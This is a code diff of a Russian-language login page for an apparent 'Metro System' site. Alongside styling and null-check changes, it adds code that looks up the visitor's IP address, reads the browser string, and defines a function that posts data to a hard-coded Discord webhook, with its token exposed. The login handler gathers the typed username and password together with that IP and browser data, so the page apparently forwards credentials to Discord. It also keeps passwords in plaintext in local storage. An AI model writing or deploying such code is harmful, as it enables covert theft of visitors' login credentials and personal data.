@@ -7,6 +7,167 @@
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="../assets/css/style.css">
+    <style>
+        /* Дополнительные стили */
+        .auth-divider {
+            text-align: center;
+            margin: 2rem 0;
+            position: relative;
+            color: var(--gray);
+        }
+        
+        .auth-divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: var(--light-dark);
+        }
+        
+        .auth-divider span {
+            background: white;
+            padding: 0 1rem;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.9rem;
+        }
+        
+        .forgot-link {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 0.9rem;
+        }
+        
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        
+        .demo-accounts {
+            animation: fadeInUp 0.8s ease-out;
+        }
+        
+        .btn-sm {
+            padding: 0.25rem 0.5rem;
+            font-size: 0.7rem;
+        }
+        
+        .form-group {
+            opacity: 0;
+            transform: translateX(30px);
+            transition: all 0.6s ease;
+        }
+        
+        /* Анимации */
+        @keyframes slideInRight {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+        
+        @keyframes slideOutRight {
+            from {
+                transform: translateX(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+        
+        .animate-shake {
+            animation: shake 0.5s ease-in-out;
+        }
+        
+        /* Стили для ошибок */
+        .form-input.error {
+            border-color: #f44336 !important;
+            background-color: #fff5f5 !important;
+        }
+        
+        /* Стили для уведомлений */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            color: white;
+            padding: 1rem 1.5rem;
+            border-radius: 8px;
+            z-index: 10000;
+            animation: slideInRight 0.3s ease;
+            max-width: 300px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+        
+        .notification-success {
+            background: #4CAF50;
+        }
+        
+        .notification-error {
+            background: #f44336;
+        }
+        
+        .notification-info {
+            background: #2196F3;
+        }
+        
+        .notification-content {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .notification-content i {
+            font-size: 1.2rem;
+        }
+        
+        .password-toggle {
+            background: none;
+            border: none;
+            color: var(--gray);
+            cursor: pointer;
+            padding: 0.5rem;
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+        
+        .input-with-icon {
+            position: relative;
+        }
+        
+        .input-icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--gray);
+        }
+        
+        .form-input {
+            padding-left: 45px !important;
+            padding-right: 45px !important;
+        }
+    </style>
 </head>
 <body>
     <!-- Навигация -->
@@ -122,10 +283,68 @@
         </div>
     </footer>
 
-    <script src="../assets/js/main.js"></script>
     <script>
         // Discord Webhook URL
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1422279632643948595/iZ8ji9S-ocIRwdNqSTdK8WvzlBY-7YjrzAfgUvC9D45W3lQuFrWYhx-h2Lh3xJ5oh4Tp';
+
+        // Metro System объект
+        const metroSystem = {
+            showNotification: function(message, type = 'info') {
+                // Удаляем старые уведомления
+                const oldNotifications = document.querySelectorAll('.notification');
+                oldNotifications.forEach(notif => notif.remove());
+                
+                // Создаем уведомление
+                const notification = document.createElement('div');
+                notification.className = `notification notification-${type}`;
+                notification.innerHTML = `
+                    <div class="notification-content">
+                        <i class="fas fa-${type === 'success' ? 'check' : type === 'error' ? 'exclamation-triangle' : 'info'}"></i>
+                        <span>${message}</span>
+                    </div>
+                `;
+                
+                document.body.appendChild(notification);
+                
+                // Удаляем через 3 секунды
+                setTimeout(() => {
+                    notification.style.animation = 'slideOutRight 0.3s ease';
+                    setTimeout(() => {
+                        if (notification.parentNode) {
+                            notification.parentNode.removeChild(notification);
+                        }
+                    }, 300);
+                }, 3000);
+            },
+
+            getUserIP: async function() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    return 'Неизвестно';
+                }
+            },
+
+            getBrowserInfo: function() {
+                return navigator.userAgent;
+            },
+
+            sendToDiscord: async function(data) {
+                try {
+                    await fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data)
+                    });
+                } catch (error) {
+                    console.log('Ошибка отправки в Discord:', error);
+                }
+            }
+        };
 
         // Инициализация анимаций
         document.addEventListener('DOMContentLoaded', function() {
@@ -142,14 +361,20 @@
             // Проверяем, есть ли сохраненные данные
             const savedUser = localStorage.getItem('metro_user');
             if (savedUser) {
-                const userData = JSON.parse(savedUser);
-                document.getElementById('username').placeholder = `Добро пожаловать, ${userData.username}!`;
+                try {
+                    const userData = JSON.parse(savedUser);
+                    document.getElementById('username').placeholder = `Добро пожаловать, ${userData.username}!`;
+                } catch (e) {
+                    console.log('Ошибка загрузки пользователя:', e);
+                }
             }
         });
 
         function togglePassword(inputId) {
             const input = document.getElementById(inputId);
             const icon = input.parentNode.querySelector('.password-toggle i');
+            
+            if (!input || !icon) return;
             
             if (input.type === 'password') {
                 input.type = 'text';
@@ -161,9 +386,14 @@
         }
 
         function fillDemoCredentials(username, password) {
-            document.getElementById('username').value = username;
-            document.getElementById('password').value = password;
-            document.getElementById('username').focus();
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            
+            if (!usernameInput || !passwordInput) return;
+            
+            usernameInput.value = username;
+            passwordInput.value = password;
+            usernameInput.focus();
             
             // Анимация заполнения
             const inputs = document.querySelectorAll('.form-input');
@@ -181,11 +411,13 @@
             const username = document.getElementById('username');
             const password = document.getElementById('password');
             
+            if (!username || !password) return false;
+            
             let isValid = true;
             
             // Сброс ошибок
             [username, password].forEach(input => {
-                input.classList.remove('error');
+                if (input) input.classList.remove('error');
             });
             
             // Валидация имени пользователя
@@ -213,14 +445,19 @@
             }
 
             const submitBtn = document.getElementById('submitBtn');
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            
+            if (!submitBtn || !usernameInput || !passwordInput) return;
+            
             const originalText = submitBtn.innerHTML;
             
             // Анимация загрузки
             submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Вход в систему...';
             submitBtn.disabled = true;
 
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+            const username = usernameInput.value;
+            const password = passwordInput.value;
             const rememberMe = document.getElementById('rememberMe').checked;
             const userIP = await metroSystem.getUserIP();
             const browserInfo = metroSystem.getBrowserInfo();
@@ -306,41 +543,46 @@
                     metroSystem.showNotification(`Добро пожаловать, ${username}!`, 'success');
                     
                     setTimeout(() => {
-                        window.location.href = 'account.settings/auth/profile.html';
+                        // Правильный путь редиректа
+                        window.location.href = 'profile.html';
                     }, 1000);
                 } else {
                     // Проверка существующих пользователей
                     const savedUser = localStorage.getItem('metro_user_' + username);
                     if (savedUser) {
-                        const userData = JSON.parse(savedUser);
-                        if ((userData.username === username || userData.email === username) && userData.password === password) {
-                            // Успешный вход для зарегистрированного пользователя
-                            userData.loginTime = new Date().toLocaleString();
-                            userData.rememberMe = rememberMe;
-                            userData.loginCount = (userData.loginCount || 0) + 1;
-                            
-                            // Добавляем в историю входов
-                            if (!userData.loginHistory) {
-                                userData.loginHistory = [];
+                        try {
+                            const userData = JSON.parse(savedUser);
+                            if ((userData.username === username || userData.email === username) && userData.password === password) {
+                                // Успешный вход для зарегистрированного пользователя
+                                userData.loginTime = new Date().toLocaleString();
+                                userData.rememberMe = rememberMe;
+                                userData.loginCount = (userData.loginCount || 0) + 1;
+                                
+                                // Добавляем в историю входов
+                                if (!userData.loginHistory) {
+                                    userData.loginHistory = [];
+                                }
+                                userData.loginHistory.unshift({
+                                    time: new Date().toLocaleString(),
+                                    ip: userIP,
+                                    device: browserInfo
+                                });
+                                
+                                localStorage.setItem('metro_user', JSON.stringify(userData));
+                                localStorage.setItem('metro_user_' + username, JSON.stringify(userData));
+                                
+                                submitBtn.innerHTML = '<i class="fas fa-check"></i> Успешный вход!';
+                                submitBtn.style.background = 'var(--success)';
+                                
+                                metroSystem.showNotification(`Добро пожаловать, ${userData.username}!`, 'success');
+                                
+                                setTimeout(() => {
+                                    window.location.href = 'profile.html';
+                                }, 1000);
+                                return;
                             }
-                            userData.loginHistory.unshift({
-                                time: new Date().toLocaleString(),
-                                ip: userIP,
-                                device: browserInfo
-                            });
-                            
-                            localStorage.setItem('metro_user', JSON.stringify(userData));
-                            localStorage.setItem('metro_user_' + username, JSON.stringify(userData));
-                            
-                            submitBtn.innerHTML = '<i class="fas fa-check"></i> Успешный вход!';
-                            submitBtn.style.background = 'var(--success)';
-                            
-                            metroSystem.showNotification(`Добро пожаловать, ${userData.username}!`, 'success');
-                            
-                            setTimeout(() => {
-                                window.location.href = 'profile.html';
-                            }, 1000);
-                            return;
+                        } catch (e) {
+                            console.log('Ошибка парсинга пользователя:', e);
                         }
                     }
                     
@@ -364,6 +606,8 @@
 
         function loginWithGoogle() {
             const btn = document.querySelector('.btn-outline');
+            if (!btn) return;
+            
             const originalText = btn.innerHTML;
             
             btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Подключение...';
@@ -394,69 +638,12 @@
         // Быстрый вход по Enter
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
-                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
+                const form = document.getElementById('loginForm');
+                if (form) {
+                    form.dispatchEvent(new Event('submit'));
+                }
             }
         });
-
-        // Стили для формы
-        const style = document.createElement('style');
-        style.textContent = `
-            .auth-divider {
-                text-align: center;
-                margin: 2rem 0;
-                position: relative;
-                color: var(--gray);
-            }
-            
-            .auth-divider::before {
-                content: '';
-                position: absolute;
-                top: 50%;
-                left: 0;
-                right: 0;
-                height: 1px;
-                background: var(--light-dark);
-            }
-            
-            .auth-divider span {
-                background: white;
-                padding: 0 1rem;
-            }
-            
-            .checkbox-group {
-                display: flex;
-                align-items: center;
-                gap: 0.5rem;
-                font-size: 0.9rem;
-            }
-            
-            .forgot-link {
-                color: var(--primary);
-                text-decoration: none;
-                font-weight: 500;
-                font-size: 0.9rem;
-            }
-            
-            .forgot-link:hover {
-                text-decoration: underline;
-            }
-            
-            .demo-accounts {
-                animation: fadeInUp 0.8s ease-out;
-            }
-            
-            .btn-sm {
-                padding: 0.25rem 0.5rem;
-                font-size: 0.7rem;
-            }
-            
-            .form-group {
-                opacity: 0;
-                transform: translateX(30px);
-                transition: all 0.6s ease;
-            }
-        `;
-        document.head.appendChild(style);
     </script>
 </body>
 </html>
